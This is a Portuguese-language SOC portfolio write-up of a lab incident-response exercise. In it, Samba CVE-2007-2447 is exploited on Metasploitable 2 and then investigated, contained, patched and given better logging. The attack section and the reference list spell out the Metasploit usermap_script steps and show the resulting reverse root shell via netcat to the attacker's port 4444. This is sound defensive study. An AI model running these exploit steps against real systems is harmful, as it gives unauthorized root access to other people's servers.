# 🛡️ Ataque 4 — Samba/SMB: Resposta a Incidente (Troubleshooting completo)

### Projeto de portfólio SOC / Blue Team — Pedro Ferraz

**Técnica MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) + T1021 (Remote Services)
**Vulnerabilidade:** CVE-2007-2447 (Samba usermap_script)
**Ambiente:** laboratório isolado (Kali atacante · Metasploitable 2 alvo · Wazuh SIEM)
**Formato:** simulação de resposta a incidente — um ataque real foi gerado e investigado como um ticket de SOC.

---

## 0. Cenário

Diferente dos ataques anteriores, este foi conduzido como um **exercício de resposta a incidente**: o ataque foi executado e, em seguida, investigado do zero, como se um ticket tivesse chegado ao plantão de SOC — sem saber de antemão o que havia acontecido.

**O ticket:**

> Host 192.168.100.50 apresentou comportamento estranho por volta das 19h. Processo desconhecido notado. Investigar: houve incidente? Qual vetor? Qual origem? Houve acesso?
> 

---

## 1. O ataque (gerado para a investigação)

Exploração do Samba 3.0.20 via Metasploit:

```
nmap -sV -p 139,445 192.168.100.50     # reconhecimento: Samba smbd 3.x
msfconsole
  use exploit/multi/samba/usermap_script
  set RHOSTS 192.168.100.50
  set LHOST 192.168.100.40
  exploit                               # → shell de root
```

Resultado: `Command shell session opened (192.168.100.40:4444 -> 192.168.100.50:53220)` — acesso root obtido.

---

## 2. INVESTIGAÇÃO (a trilha de evidências)

A investigação seguiu o método do analista: formular hipótese, verificar, eliminar.

**Passo 1 — SIEM (Wazuh).** Busca por IP de origem, nome do serviço e porta. Resultado: **nada.** O ataque não gerou alerta no SIEM.

**Passo 2 — Firewall.** Resultado: **nada.**

> Lição: o firewall detecta o que ele BLOQUEIA; é cego para o que PERMITE. O Samba roda numa porta aberta e permitida (139/445), então o tráfego passa direto, sem bloqueio e sem log.
> 

**Passo 3 — Log geral do Samba** (`/var/log/samba/log.smbd`). Resultado: só mensagens de "Samba started". Nada do ataque.

**Passo 4 — Log por cliente.** Descoberta-chave no `ls -la /var/log/samba/`:

```
-rw-r--r-- 1 root root  0  ...  log.192.168.100.40
```

O Samba cria um arquivo de log por IP de cliente. A **existência** do arquivo `log.192.168.100.40` já prova que o IP do atacante se conectou ao servidor. Mas o tamanho era **0 bytes** — vazio.

> Lição: a existência do arquivo é prova da conexão (origem confirmada). O conteúdo vazio revela o ponto cego.
> 

---

## 3. CONCLUSÃO DA INVESTIGAÇÃO (laudo)

| Item | Resultado |
| --- | --- |
| Houve incidente? | Sim — conexão não autorizada ao serviço Samba |
| Vetor de entrada | Porta 139/445 (Samba/SMB), via CVE-2007-2447 |
| Origem do ataque | 192.168.100.40 (confirmado pelo arquivo de log por cliente) |
| Nível de acesso | Root (shell reverso) |
| Visibilidade no SIEM | **Nenhuma** — ataque invisível com a config padrão |

> Lição central: ataque a um serviço legítimo, em porta aberta, com log mínimo = ponto cego clássico. Nem SIEM, nem firewall, nem log local capturaram. Os ataques mais perigosos muitas vezes não aparecem nos lugares óbvios.
> 

---

## 4. CONTENÇÃO (parar o incidente ativo)

Princípio de resposta a incidente: **conter antes de corrigir.** Havia um atacante com shell ativo.

Identificação da conexão ativa:

```
netstat -antp | grep "192.168.100.40"
```

```
tcp  192.168.100.50:53220  192.168.100.40:4444  ESTABLISHED  5274/nc     ← shell reverso do atacante
tcp  192.168.100.50:139    192.168.100.40:38055 CLOSE_WAIT   5270/smbd   ← vetor de entrada (Samba)
```

Essa saída mostra o vetor (porta 139/Samba) E o canal de controle (netcat na 4444).

Contenção cirúrgica — matar só o processo do atacante, sem derrubar o servidor:

```
kill 5274
netstat -antp | grep "192.168.100.40"    # confirmar que a conexão morreu
```

> Lição: contenção cirúrgica (matar o processo malicioso) preserva o serviço para usuários legítimos. E verificar persistência (cron, usuários novos) é parte da contenção completa.
Nota técnica: distinguir conexão `tcp` (rede, com IP remoto) de socket `unix` (interno da máquina) — um socket unix nunca é o atacante remoto.
> 

---

## 5. CORREÇÃO (causa raiz)

**Causa raiz:** Samba 3.0.20 (2007), vulnerável a CVE-2007-2447 (execução remota de comando).

Hierarquia de correção (da ideal à paliativa):

1. **Patch (atualizar):** `apt-get install --only-upgrade samba`
2. **Desativar o serviço:** `/etc/init.d/samba stop` + `update-rc.d -f samba remove`
3. **Isolar:** segmentar o host em rede restrita com acesso controlado à 139/445

Verificar versão: `smbd --version`

> No laboratório, a correção foi documentada como recomendação mas NÃO aplicada — atualizar/desativar removeria o alvo de estudo. No mundo real, o patch seria a primeira ação.
> 

---

## 6. DETECÇÃO (dar visibilidade) — PARCIALMENTE CONCLUÍDO

O problema diagnosticado: o Samba vinha com `log level = 0` (quase não registra).

**Feito:** aumentei o nível de log no `/etc/samba/smb.conf`:

```
[global]
   log level = 2
   log file = /var/log/samba/log.%m
   max log size = 1000
```

Após reiniciar o Samba, o log por cliente (antes vazio) passou a registrar as conexões:

```
[2026/10/29 19:59:06, 2] smbd/reply.c:reply_special
  netbios connect: name1=192.168.100.50  name2=KALI
```

O ponto cego foi iluminado — o ataque agora deixa rastro local.

**Pendente (próxima sessão):**

- Fazer o log do Samba chegar ao Wazuh (via syslog — `syslog = 2` / `syslog only = yes` no smb.conf, já que o Samba escreve direto no arquivo e não passa pelo syslog por padrão).
- Escrever a regra de detecção no Wazuh (correlação de conexões Samba).
- Re-atacar e validar o alerta no dashboard.

---

## 7. Conceitos demonstrados

- Metodologia de resposta a incidente: **Investigação → Contenção → Erradicação/Correção → Detecção**
- Investigação por trilha de evidências (SIEM → firewall → log local → log por cliente)
- Firewall detecta o que bloqueia, é cego ao que permite
- Leitura de `netstat`: identificar vetor, canal de controle (shell reverso), e distinguir tcp de socket unix
- Contenção cirúrgica (matar processo malicioso sem derrubar o serviço)
- Hierarquia de correção: patch > desativar > isolar
- Instrumentação de log em serviço legado (Samba log level)
- Uso do Metasploit Framework
- MITRE ATT&CK: T1190, T1021

---

## Comandos de referência

```
# Ataque (Kali)
nmap -sV -p 139,445 192.168.100.50
msfconsole → use exploit/multi/samba/usermap_script → set RHOSTS/LHOST → exploit

# Investigação (no host alvo)
ls -la /var/log/samba/
cat /var/log/samba/log.<IP-do-atacante>
netstat -antp | grep "<IP-do-atacante>"

# Contenção
kill <PID-do-processo-malicioso>

# Correção (referência)
smbd --version
apt-get install --only-upgrade samba        # patch
/etc/init.d/samba stop                        # desativar

# Detecção (dar visibilidade)
# /etc/samba/smb.conf → log level = 2
```

*Projeto realizado em laboratório isolado e controlado, exclusivamente para estudo de detecção e defesa.*

